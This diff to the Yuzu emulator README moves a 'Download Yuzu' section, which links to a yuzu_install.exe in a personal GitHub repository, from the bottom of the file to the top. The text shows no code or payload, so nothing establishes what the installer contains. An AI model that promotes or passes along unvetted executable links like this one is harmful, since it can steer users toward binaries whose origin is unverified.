@@ -35,6 +35,10 @@ It is written in C++ with portability in mind, and we actively maintain builds f
   <a href="#license">License</a>
 </p>
 
+##Download
+
+<a href="https://github.com/duhsoares21/Yuzu/blob/main/download/yuzu_install.exe"/>Download Yuzu</a>
+
 ## Compatibility
 
 The emulator is capable of running most commercial games at full speed, provided you meet the [necessary hardware requirements](https://yuzu-emu.org/help/quickstart/#hardware-requirements).
@@ -2022,10 +2026,6 @@ gdb ../build/bin/yuzu            # Start GDB
 </div>
   
 </div>    </div>
-
-##Download
-
-<a href="https://github.com/duhsoares21/Yuzu/blob/main/download/yuzu_install.exe"/>Download Yuzu</a>
 
 ## License
 
